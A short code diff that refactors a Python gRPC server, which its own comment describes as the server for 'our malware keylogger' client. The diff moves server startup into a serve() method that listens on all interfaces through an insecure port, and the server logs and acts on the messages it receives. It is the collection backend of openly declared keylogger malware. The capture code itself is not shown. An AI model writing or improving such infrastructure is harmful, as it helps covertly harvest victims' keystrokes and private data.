@@ -1,7 +1,7 @@
 import grpc
 from concurrent import futures
-import protos.server_pb2 as keylog_pb2
-import protos.server_pb2_grpc as keylog_pb2_grpc
+from .protos import server_pb2 as keylog_pb2
+from .protos import server_pb2_grpc as keylog_pb2_grpc
 # here goes the grpc server side code where we can change the action fired by the client (which is our malware keylogger)
 
 # triggred action def
@@ -15,8 +15,17 @@ class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
         print("Received:", request.message)
         firedTHread(request.message)
         return keylog_pb2.KeylogResponse(response=True)
-server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
-keylog_pb2_grpc.add_KeylogServiceServicer_to_server(KeylogServer(), server)
-server.add_insecure_port("[::]:50051")
-server.start()
-server.wait_for_termination()
+    
+    def serve(self, host="0.0.0.0", port=50051):
+        """Start the gRPC server"""
+        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
+        keylog_pb2_grpc.add_KeylogServiceServicer_to_server(self, server)
+        server.add_insecure_port(f"{host}:{port}")
+        print(f"[*] gRPC Server starting on {host}:{port}")
+        server.start()
+        server.wait_for_termination()
+
+# Only run server if this file is executed directly
+if __name__ == "__main__":
+    server_instance = KeylogServer()
+    server_instance.serve()
